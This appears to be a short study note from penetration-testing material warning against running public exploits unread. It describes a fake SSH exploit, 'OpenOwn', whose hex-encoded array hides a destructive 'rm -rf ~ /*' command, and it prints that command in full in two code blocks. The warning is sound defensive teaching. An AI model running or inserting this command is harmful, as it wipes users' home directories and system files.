***NOTE***
By downloading and running public exploits, we can _**greatly**_ endanger any system that runs that code.  
Carefully read and understand the code before execution to ensure no negative effects.  
  
Ex:    **OpenOwn** (a remote exploit for SSH) asks for root privileges and has a _jmpcode_ array in it's payload.  
		This _jmpcode_ array is actually a hex-encoded string containing the malicious shell command:  
```bash
rm -rf ~ /* 2> /dev/null &
```
	  In the lines that followed, the program would connect to a public IRC server to announce the user's idiocy to the world.  
  
  
- Using trustworthy exploit repositories is crucial. The online resources mentioned in the materials analyze submitted exploit code before hosting it online.
- Not to say you shouldn't read the code & verify everything's above board prior to execution.
- If code inspection or compilation is too complex, set up a vm w/ a clean snapshot as an exploit sandbox.
  
Way to check shellcode:  
```python
python  
>>> jmpcode = ["\x72\x6D.........."]  
>>> print jmpcode  
	['rm -rf ~ /* 2> /dev/null &']  
>>> quit
```
